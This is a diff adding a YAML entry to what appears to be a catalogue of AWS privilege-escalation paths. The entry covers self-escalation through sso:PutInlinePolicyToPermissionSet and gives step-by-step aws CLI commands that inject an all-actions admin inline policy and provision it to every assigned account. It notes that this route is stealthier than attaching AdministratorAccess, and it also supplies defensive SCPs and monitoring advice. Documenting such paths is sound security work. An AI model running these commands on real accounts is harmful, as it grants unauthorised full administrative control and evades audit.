@@ -1,0 +1,137 @@
+id: sso-003
+name: sso:PutInlinePolicyToPermissionSet
+category: self-escalation
+services:
+- sso-admin
+description: |
+  An attacker with `sso:PutInlinePolicyToPermissionSet` can inject an inline policy with `"Action": "*", "Resource": "*"` into an existing permission set they are assigned to. This achieves the same result as attaching AdministratorAccess but uses an inline policy instead of a managed policy. The inline approach may be less visible since it doesn't reference a well-known policy ARN.
+prerequisites:
+  admin:
+  - Attacker must already have an SSO assignment with a permission set they can modify
+  - Attacker must have `sso:PutInlinePolicyToPermissionSet` permission
+  - Must know the Identity Center instance ARN and permission set ARN
+  lateral:
+  - Attacker must already have an SSO assignment with the target permission set
+  - Must have sso:PutInlinePolicyToPermissionSet on the target permission set
+permissions:
+  required:
+  - permission: sso:PutInlinePolicyToPermissionSet
+    resourceConstraints: Must have permission to add inline policies to the target permission set ARN
+  additional:
+  - permission: sso:ListPermissionSets
+    resourceConstraints: Helpful for discovering available permission sets
+  - permission: sso:GetInlinePolicyForPermissionSet
+    resourceConstraints: Useful for viewing existing inline policies on permission sets
+  - permission: sso:ProvisionPermissionSet
+    resourceConstraints: May be needed to push changes to assigned accounts
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sso-admin list-instances
+    description: Discover the Identity Center instance ARN
+  - step: 2
+    command: |
+      aws sso-admin list-permission-sets \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID
+    description: List permission sets to find the one assigned to the attacker
+  - step: 3
+    command: |
+      aws sso-admin put-inline-policy-to-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+    description: Inject an admin inline policy into the permission set
+  - step: 4
+    command: |
+      aws sso-admin provision-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-INSTANCE_ID \
+        --permission-set-arn arn:aws:sso:::permissionSet/ssoins-INSTANCE_ID/ps-PERMISSION_SET_ID \
+        --target-type ALL_PROVISIONED_ACCOUNTS
+    description: Provision the permission set to push the inline policy change to all assigned accounts
+  - step: 5
+    command: echo "Log in to SSO portal - permission set now grants full admin via inline policy"
+    description: Access the account via SSO with the now-elevated permission set
+recommendation: |
+  Same protections as sso-002 — restrict who can modify permission sets. Also consider using permission set provisioning pipelines that detect drift.
+
+  SCP to restrict inline policy modifications:
+  ```json
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Deny",
+        "Action": [
+          "sso:PutInlinePolicyToPermissionSet",
+          "sso:DeleteInlinePolicyFromPermissionSet",
+          "sso:AttachManagedPolicyToPermissionSet"
+        ],
+        "Resource": "*",
+        "Condition": {
+          "StringNotLike": {
+            "aws:PrincipalARN": "arn:aws:iam::*:role/SSOAdmin-BreakGlass"
+          }
+        }
+      }
+    ]
+  }
+  ```
+
+  Additional controls:
+  - **Monitor CloudTrail** — Alert on `PutInlinePolicyToPermissionSet` events, especially with broad policy documents
+  - **Detect drift** — Use IaC pipelines (Terraform/CloudFormation) for permission set management and detect unauthorized changes
+  - **Restrict inline policy content** — While harder to enforce via SCPs, detect and alert on inline policies with `"Action": "*"`
+  - **Separate duty** — Principals assigned to permission sets should not be able to modify those same sets
+  - **Regular audits** — Review inline policies on all permission sets periodically
+  - **Prefer managed policies** — Use managed policies over inline policies for easier auditing and monitoring
+limitations: |
+  Same as sso-002 — requires existing SSO assignment via the target permission set. The inline policy approach is stealthier (no reference to a well-known policy ARN like AdministratorAccess) but achieves the same result.
+discoveryAttribution:
+  firstDocumented:
+    author: Paramanand Mallik
+    date: "2026"
+    link: https://github.com/DataDog/pathfinding.cloud/pull/XX
+references:
+- title: AWS Documentation - Inline Policies for Permission Sets
+  url: https://docs.aws.amazon.com/singlesignon/latest/userguide/permissionsetsconcept.html
+- title: AWS Documentation - PutInlinePolicyToPermissionSet API
+  url: https://docs.aws.amazon.com/singlesignon/latest/APIReference/API_PutInlinePolicyToPermissionSet.html
+relatedPaths:
+- sso-001
+- sso-002
+attackVisualization:
+  nodes:
+  - id: attacker
+    label: SSO User (Low Privilege)
+    type: principal
+    description: |
+      An SSO user who already has an account assignment with a permission set. The user also has `sso:PutInlinePolicyToPermissionSet` permission.
+  - id: permission_set
+    label: Existing Permission Set
+    type: resource
+    description: |
+      The permission set already assigned to the attacker. Currently grants limited permissions. The attacker will inject an admin inline policy into it.
+  - id: admin_outcome
+    label: Full Admin via SSO
+    type: outcome
+    description: |
+      After injecting the inline policy and provisioning, the attacker's SSO access is elevated to full admin in all assigned accounts.
+  edges:
+  - from: attacker
+    to: permission_set
+    label: sso:PutInlinePolicyToPermissionSet
+    description: |
+      Inject an inline policy with `"Action": "*", "Resource": "*"` into the permission set.
+
+      Command:
+      ```bash
+      aws sso-admin put-inline-policy-to-permission-set \
+        --instance-arn INSTANCE_ARN \
+        --permission-set-arn PERM_SET_ARN \
+        --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+      ```
+  - from: permission_set
+    to: admin_outcome
+    label: Provisioned with admin inline policy
+    description: |
+      After provisioning, the permission set includes the admin inline policy. The attacker's existing SSO assignment now grants full administrative access.
